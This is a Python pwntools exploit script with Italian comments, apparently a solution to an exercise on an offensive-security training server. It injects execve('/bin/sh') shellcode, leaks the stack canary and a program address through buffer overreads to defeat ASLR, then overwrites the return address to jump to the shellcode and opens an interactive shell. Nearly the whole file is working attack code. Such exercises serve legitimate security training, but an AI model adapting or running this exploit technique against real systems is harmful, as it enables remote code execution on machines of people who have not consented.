'''
Non fa mettere breakpoint quindi devo fare disassemble main e lì vedo gli indirizzi, così riesco a mettere i breakpoint,
ad esempio la read è a +229 quindi nel breakpoint metto b *main +229 
'''
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

# b *main +179 è l'indirizzo della prima read
if "REMOTE" not in args:
    r = process("./aslr")
    gdb.attach(r, """
            #b 0x100a94
            b *main +229
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2012)

asm_code = """
            pop rdi
            mov rax,0x3b
            mov rsi,0x0
            mov rdx,0x0 
            add rdi,0x1c 
            syscall
        """

'''
CON QUESTO FUNZIONA
jmp SHELLXY
RETXY: pop rdi		    ;the saved EIP will have the address of the string for the syscall ("/bin/sh")
mov rax,0x3b		    ;syscall code
mov rsi,0x0
mov rdx,0x0
syscall			        ;syscall(rax, rdi, rsi, rdx)
SHELLXY: call RETXY     ;we call a function so that the saved EIP will point to the next line
			            ;on this line we will have the string for the syscall ("/bin/sh")
'''

############# SHELLCODE ################
context.arch = 'amd64'
stringa = "/bin/sh"
shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")
r.sendline(res)

################ LEAK CANARY ################
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)

print("[!] leaked_canary %s" % leaked_canary)
print("[!] leaked_canary %#x" % canary)

################ LEAK ADDRESS ################
r.send(b"A"*136)
r.recvuntil(b"> ")
r.read(136)
leaked_address = r.read(6) + b"\x00\x00"
addr = u64(leaked_address)
print("leaked address %#x" % addr)

myAddr = int(0x0000558d84e00960)  # leaked address (address che sta nel programma --> lo vedo con vmmap) in locale; ho preso questo address che sta in text perchè bss e text sono uno sopra l'altro
my_ps1 = int(0x558d85001080)  # indirizzo della ps1 in locale (facendo p &ps1 in gdb)


programOffset = my_ps1 - myAddr
print("program offset %d" % int(programOffset))

ps1_global = addr + programOffset
print("Where to jump %#x" % ps1_global)
ps1_little_endian = ps1_global.to_bytes(8, byteorder='little')

################ EXPLOIT ################
payload = b"\x90"*104 + leaked_canary + b"B" * 8 + ps1_little_endian
r.send(payload)
time.sleep(0.1)
r.sendline("")

r.interactive()